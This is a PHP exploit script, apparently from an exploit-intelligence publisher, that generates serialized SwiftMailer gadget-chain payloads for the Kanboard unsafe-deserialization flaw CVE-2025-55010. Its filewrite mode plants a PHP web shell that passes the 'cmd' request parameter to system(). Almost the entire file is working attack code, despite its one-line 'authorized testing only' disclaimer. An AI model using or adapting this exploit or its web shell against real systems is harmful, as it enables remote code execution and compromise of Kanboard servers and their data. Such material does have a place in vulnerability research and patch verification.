#!/usr/bin/env php
<?php
// ──────────────────────────────────────────────────────────────────────
// Exploit Title  : Kanboard SwiftMailer Gadget Chain Payload Generator
// CVE            : CVE-2025-55010
// Vendor         : Kanboard
// Product        : Kanboard
// Author         : Exploit Intelligence Platform
// Website        : https://exploit-intel.com
// Twitter        : @exploit_intel
// Date           : 2026-02-27
//
// For authorized security testing and educational purposes only.
// ──────────────────────────────────────────────────────────────────────
/**
 * Payload generator for CVE-2025-55010
 * Generates a PHP-serialized SwiftMailer gadget chain payload for Kanboard unsafe deserialization.
 *
 * This script must be run INSIDE the Kanboard container where SwiftMailer classes are available.
 *
 * Usage: php generate_payload.php [marker|filewrite] [target_path]
 *
 * Modes:
 *   marker    - Generates a payload that embeds a unique marker string in the __toString() output.
 *               This proves deserialization + arbitrary object instantiation + __toString() trigger.
 *   filewrite - Generates a payload that writes a file via DiskKeyCache gadget chain.
 *               Demonstrates arbitrary file write capability.
 */

// Include Kanboard's autoloader to get SwiftMailer classes
require '/var/www/app/vendor/autoload.php';

$mode = isset($argv[1]) ? $argv[1] : 'filewrite';
$target_path = isset($argv[2]) ? $argv[2] : '/var/www/app/plugins';

// ========================================================================
// APPROACH: Use PHP Reflection to set private properties on existing classes
// This avoids the complexity of manually crafting serialized strings.
// ========================================================================

/**
 * Helper: Set a private property on an object (bypassing access restrictions)
 */
function setPrivateProperty($object, $className, $propertyName, $value) {
    $ref = new ReflectionClass($className);
    $prop = $ref->getProperty($propertyName);
    $prop->setAccessible(true);
    $prop->setValue($object, $value);
}

/**
 * Build a SimpleMimeEntity gadget using NullKeyCache (marker mode).
 * When __toString() is triggered, the body content is returned as a string.
 * The NullKeyCache prevents file operations and cleanup issues.
 */
function buildMarkerPayload() {
    $marker = "CVE-2025-55010-DESERIALIZATION-PROOF-" . bin2hex(random_bytes(8));

    // Create the NullKeyCache (no file operations, no cleanup)
    $cache = new Swift_KeyCache_NullKeyCache();

    // Create the RawContentEncoder (passthrough — returns input unchanged)
    $encoder = new Swift_Mime_ContentEncoder_RawContentEncoder();

    // Create a Grammar instance (needed for grammar validation, but we won't trigger it)
    $grammar = new Swift_Mime_Grammar();

    // Create a SimpleHeaderSet with minimal properties
    // We need a factory for construction, but toString() won't need it if _headers is empty
    // Use reflection to create a bare-minimum object
    $headerFactory = new Swift_Mime_SimpleHeaderFactory(
        new Swift_Mime_HeaderEncoder_QpHeaderEncoder(
            new Swift_CharacterStream_ArrayCharacterStream(
                new Swift_CharacterReaderFactory_SimpleCharacterReaderFactory(),
                'utf-8'
            )
        ),
        new Swift_Encoder_Rfc2231Encoder(
            new Swift_CharacterStream_ArrayCharacterStream(
                new Swift_CharacterReaderFactory_SimpleCharacterReaderFactory(),
                'utf-8'
            )
        ),
        $grammar
    );

    $headers = new Swift_Mime_SimpleHeaderSet($headerFactory);

    // Now build the SimpleMimeEntity through the constructor
    $entity = new Swift_Mime_SimpleMimeEntity($headers, $encoder, $cache, $grammar);

    // Override the body to our marker — use reflection for private property
    setPrivateProperty($entity, 'Swift_Mime_SimpleMimeEntity', '_body', $marker);

    // Ensure _immediateChildren is empty (it should be by default)
    setPrivateProperty($entity, 'Swift_Mime_SimpleMimeEntity', '_immediateChildren', array());

    // Clear the _children array too
    setPrivateProperty($entity, 'Swift_Mime_SimpleMimeEntity', '_children', array());

    // Set a known cache key
    setPrivateProperty($entity, 'Swift_Mime_SimpleMimeEntity', '_cacheKey', 'poc_marker');

    return array('entity' => $entity, 'marker' => $marker);
}

/**
 * Build a SimpleMimeEntity gadget using DiskKeyCache (file write mode).
 * When __toString() is triggered, it writes a file via DiskKeyCache::setString().
 * File path: $target_path/$cacheKey/body
 */
function buildFileWritePayload($target_path) {
    $webshell_content = '<?php echo "CVE-2025-55010-RCE-VERIFIED"; if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>';
    $cacheKey = 'poc_exploit';

    // Create the SimpleKeyCacheInputStream (needed by DiskKeyCache constructor)
    $stream = new Swift_KeyCache_SimpleKeyCacheInputStream();

    // Create the DiskKeyCache pointing to our target directory
    $diskCache = new Swift_KeyCache_DiskKeyCache($stream, $target_path);

    // Create the RawContentEncoder (passthrough)
    $encoder = new Swift_Mime_ContentEncoder_RawContentEncoder();

    // Create a Grammar instance
    $grammar = new Swift_Mime_Grammar();

    // Create a minimal HeaderSet
    $headerFactory = new Swift_Mime_SimpleHeaderFactory(
        new Swift_Mime_HeaderEncoder_QpHeaderEncoder(
            new Swift_CharacterStream_ArrayCharacterStream(
                new Swift_CharacterReaderFactory_SimpleCharacterReaderFactory(),
                'utf-8'
            )
        ),
        new Swift_Encoder_Rfc2231Encoder(
            new Swift_CharacterStream_ArrayCharacterStream(
                new Swift_CharacterReaderFactory_SimpleCharacterReaderFactory(),
                'utf-8'
            )
        ),
        $grammar
    );

    $headers = new Swift_Mime_SimpleHeaderSet($headerFactory);

    // Build the entity
    $entity = new Swift_Mime_SimpleMimeEntity($headers, $encoder, $diskCache, $grammar);

    // Set the body to webshell content
    setPrivateProperty($entity, 'Swift_Mime_SimpleMimeEntity', '_body', $webshell_content);

    // Ensure no children
    setPrivateProperty($entity, 'Swift_Mime_SimpleMimeEntity', '_immediateChildren', array());
    setPrivateProperty($entity, 'Swift_Mime_SimpleMimeEntity', '_children', array());

    // Set the cache key (this becomes the subdirectory name)
    setPrivateProperty($entity, 'Swift_Mime_SimpleMimeEntity', '_cacheKey', $cacheKey);

    return array(
        'entity' => $entity,
        'file_path' => $target_path . '/' . $cacheKey . '/body',
        'webshell_content' => $webshell_content
    );
}

// ========================================================================
// Build the complete payload array
// ========================================================================

if ($mode === 'marker') {
    $result = buildMarkerPayload();
    $entity = $result['entity'];
    $marker = $result['marker'];

    // Build the outer array that unserializeEvent() expects
    $payload = array(
        'task' => array('id' => 1, 'title' => 'test'),
        'comment' => array(
            'comment' => $entity,  // This triggers __toString() during markdown rendering
            'visibility' => 'app-user',
        ),
    );

    $serialized = serialize($payload);

    // Output as base64 for safe transport
    echo "MODE=marker\n";
    echo "MARKER=" . $marker . "\n";
    echo "PAYLOAD_B64=" . base64_encode($serialized) . "\n";
    echo "PAYLOAD_LEN=" . strlen($serialized) . "\n";

} elseif ($mode === 'filewrite') {
    $result = buildFileWritePayload($target_path);
    $entity = $result['entity'];

    // Build the outer array
    $payload = array(
        'task' => array('id' => 1, 'title' => 'test'),
        'comment' => array(
            'comment' => $entity,
            'visibility' => 'app-user',
        ),
    );

    $serialized = serialize($payload);

    // Output as base64
    echo "MODE=filewrite\n";
    echo "FILE_PATH=" . $result['file_path'] . "\n";
    echo "PAYLOAD_B64=" . base64_encode($serialized) . "\n";
    echo "PAYLOAD_LEN=" . strlen($serialized) . "\n";

} else {
    fwrite(STDERR, "Unknown mode: $mode. Use 'marker' or 'filewrite'.\n");
    exit(1);
}

// Verify the payload starts with 'a' (required by unserializeEvent)
if ($serialized[0] !== 'a') {
    fwrite(STDERR, "ERROR: Payload does not start with 'a'!\n");
    exit(1);
}

fwrite(STDERR, "Payload generated successfully. Length: " . strlen($serialized) . " bytes\n");
fwrite(STDERR, "First 3 chars: " . substr($serialized, 0, 3) . "\n");
